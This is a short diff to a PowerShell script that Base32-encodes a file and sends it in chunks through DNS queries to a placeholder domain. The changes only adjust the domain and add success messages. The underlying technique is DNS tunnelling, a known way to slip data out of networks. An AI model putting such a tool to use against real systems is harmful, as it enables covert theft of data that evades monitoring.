@@ -2,7 +2,7 @@
 
 # Set DNS Server and Domain
 $DNS_PORT = 53
-$domain = "fileupload.domain.com"  # Domain to use
+$domain = "fileupload.example.com"  # Domain to use
 
 # Base32 encoding function in PowerShell
 function Base32-Encode {
@@ -152,6 +152,9 @@ function Send-FileChunks {
     }
 
     $fileStream.Close()
+
+    # Success message after all chunks are sent
+    Write-Host "All chunks sent successfully!"
 }
 
 # Function to signal end of transmission
@@ -190,6 +193,9 @@ function Send-File {
 
     # Signal the end of transmission
     Send-EndSignal -server $server -domain $domain -maxDelay $maxDelay
+
+    # Print success message after entire file is sent and transmission ends
+    Write-Host "File transmission complete!"
 }
 
 # Example usage of the main function
